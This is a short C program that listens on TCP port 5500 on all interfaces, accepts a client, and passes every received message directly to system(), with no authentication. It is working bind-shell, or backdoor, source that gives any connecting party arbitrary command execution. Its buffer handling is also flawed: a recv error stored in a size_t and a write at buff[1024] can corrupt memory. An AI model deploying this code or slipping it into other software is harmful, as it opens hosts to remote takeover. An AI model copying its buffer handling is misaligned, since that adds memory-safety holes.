#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <stdbool.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

int main(){
    int FD = socket(AF_INET, SOCK_STREAM, 0);
//    char* IP = "127.0.0.1";

    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_port = htons(5500);
    address.sin_addr.s_addr = INADDR_ANY;
    //inet_pton(AF_INET, IP, &address.sin_addr.s_addr);

    int resBind = bind(FD, (struct sockaddr*)&address, sizeof(address));

    if(~resBind){
        printf("%s", "Binding succeeded\n");
    }
    else{
        printf("%s", "Binding error!\n");
    }

    int resListen = listen(FD, 10);
    if(~resListen){
        printf("Listening succeeded\n");
    }
    else{
        printf("Listening error\n");
    }

    struct sockaddr_in Caddress;
    socklen_t Csz = sizeof(Caddress);

    int CFD = accept(FD, (struct sockaddr*)&Caddress, &Csz);

    if(~CFD){
        printf("Client resieved\n");
    }
    else{
        printf("Error accepting\n");
    }




    char buff[1024];
    while(true){
        memset(buff, 0, sizeof(buff));
        size_t sz = recv(CFD, buff, 1024, 0);
        if(sz > 0){
            buff[sz] = '\0';
            system(buff);
//            printf("Response was %s\n", buff);
        }
        else
            break;
    }


    close(FD);
    close(CFD);
    shutdown(FD, SHUT_RDWR);
    return 0;
}
